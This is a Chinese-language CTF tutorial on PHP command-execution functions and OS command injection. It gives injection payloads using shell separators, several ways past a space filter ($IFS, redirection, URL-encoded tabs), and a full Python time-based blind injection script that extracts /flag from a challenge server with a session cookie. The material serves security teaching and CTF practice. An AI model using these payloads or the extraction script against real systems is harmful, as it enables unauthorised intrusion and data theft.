## 命令执行函数

### system

system(string $command,int $return_var=?)

常用参数：

command参数：执行command参数所指定的命令，并且输出执行结果

如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中

能够直接回显结果

![](../image/命令执行-1.png)

### exec

exec(string $command,array &$output=?,int &$return_var=?)

command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显（如果需要显示所有内容要定义一个数组），直接用echo只会回显最后一行

output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组。

需要借用print_r或者var_dump来输出结果

![](../image/命令执行-2.png)

### passthru

passthru(string $command,int &$return_var=?)

command参数：要执行的命令

输出二进制数据，并且需要直接传送到浏览器。

直接回显结果

![](../image/命令执行-3.png)

### shell_exec

shell_exec(string $cmd)

cmd参数：要执行的命令

环境执行命令，并且将完整的输出以字符串的方式返回。功能等同于反引号

借用echo、print等输出结果

![](../image/命令执行-4.png)

### 反引号

反引号\`要执行的命令\`（反引号`在键盘左上角~号下面）

反引号能够执行程序指令

不能直接回显，需要使用echo/print来输出

![](../image/命令执行-5.png)

### popen

popen(string $command,string $mode)

command参数：要执行的命令。

mode参数：模式。'r'表示读取，'w'表示写入。

fgets获取内容->print_r输出内容

需要先fgets或者fread获取popen()的内容，然后再用echo或print_r输出

![](../image/命令执行-6.png)

### proc_open

proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)

command参数：要执行的命令

descriptor_spec参数：定义数组内容

pipes参数：调用数组内容

![](../image/命令执行-7.png)

### pcntl_exec

pcntl_exec(string $path,array $args=?,array $envs=?)

pathpath必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/user/local/bin/perl的perl脚本）

args是一个要传递给程序的参数的字符串数组

envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=>value格式的，key代表要传递的环境变量的名称，value代表该环境变量值

**在当前进程空间执行指定程序**

### 补充：assert和eval

eval定义和用法：
1.eval会把字符串当作PHP代码来执行
2.eval语法非常严格，所有的要执行的php字符串都必须完整，且以分号结尾
3.如果字符串中带有return，会立刻终止执行并返回NULL
4.如果代码中存在解析错误，则 eval() 函数返回 false

assert的定义与用法：
1.assert会把字符串当作PHP代码来执行
2.assert被认定为一个可变函数

## 操作系统连接符

### ;

使多个命令按顺序执行

前面的命令和后面的命令都会执行

如果前面的命令出错不影响后面的命令执行

```
#id;ls;pwd
```

![](../image/命令执行-18.png)

实例：

![](../image/命令执行-19.png)

```
payload：?cmd=;cat flag.php
```

连接之后代码变为

```
ls;cat flag.php
```

然后右键查看源码即可查看flag，或者使用tac直接回显

### &

使命令在后台运行

这样就可以同时执行多条命令

如果前面的命令出错不影响后面的命令执行

![](../image/命令执行-20.png)

注意：这里&要使用url编码

### &&

如果前面的命令执行成功

则执行后面的命令

前面的命令执行成功才会进行后面的命令

![](../image/命令执行-21.png)

### |

将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；

前面的命令和后面的命令都会执行，但只显示后面的命令执行结果

![](../image/命令执行-22.png)

### ||

类似于程序中的if-else语句。

若前面的命令执行成功，则后面的命令就不会执行

若前面的命令执行失败，则执行后面的命令

实例：

![](../image/命令执行-23.png)

```
payload：?cmd=ls||
```

## 空格过滤绕过

例题：

![](../image/命令执行-24.png)

![](../image/命令执行-25.png)

### **绕过方法：**

#### 1.大括号{cat,flag.txt};

#### 2.$IFS代替空格;$IFS、${IFS}、$IFS$9

Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。

```
?cmd=ls$IFS-l
```

单纯$IFS2，IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。

```
?cmd=ls${IFS}-l
```

$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串

```
?cmd=ls$IFS$9-l
```

#### 3.重定向字符<，<>;

"<"表示的是输入重定向的意思，就是把<后面跟的文件取代键盘作为新的输入设备。

```
?cmd=cat<flag.php
```

```
?cmd=cat<>flag.php
```

4.url编码：%09（Tab），%20（space）;

```
?cmd=cat%09flag.php
```

一般使用%09，因为%20就是空格，空格被过滤了。

### python脚本

**![](../image/命令执行-32.png)**

脚本：

```
import requests
import time

url = "http://challenge.xinshi.fun:38899/execute_command"
cookies = {
    "session": "eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.aJ75HQ.mrngiiFtMg73UlO-3IFC58OnbP0"
}

result = ""
session = requests.session()

# 先获取基准响应时间
def get_baseline():
    normal_payload = {"command": "echo baseline"}
    start = time.time()
    requests.post(url, cookies=cookies, data=normal_payload)
    return time.time() - start

baseline = get_baseline()
print(f"基准响应时间: {baseline:.3f}秒")

for i in range(1, 5):  # 假设获取前4行
    row_result = ""
    for j in range(1, 100):
        for k in range(32, 128):
            char = chr(k)
            time.sleep(0.1)
            # 使用$(...)代替反引号
            payload = {
                "command": f"if [ \"$(cat /flag | awk 'NR=={i}' | cut -c {j})\" = \"{char}\" ]; then sleep 2; fi"
            }
            try:
                start = time.time()
                session.post(url, cookies=cookies, data=payload, timeout=3)
                elapsed = time.time() - start
                # 判断延迟是否明显超过基准
                if elapsed > baseline + 1.5:  # 1.5秒阈值
                    row_result += char
                    print(f"行{i} 当前结果: {row_result}")
                    break
            except requests.exceptions.Timeout:
                row_result += char
                print(f"行{i} 当前结果: {row_result}")
                break
            except Exception as e:
                print(f"请求出错: {e}")
                time.sleep(1)  # 出错后等待1秒
    result += row_result + "\n"
    print(f"当前完整结果:\n{result}")
```
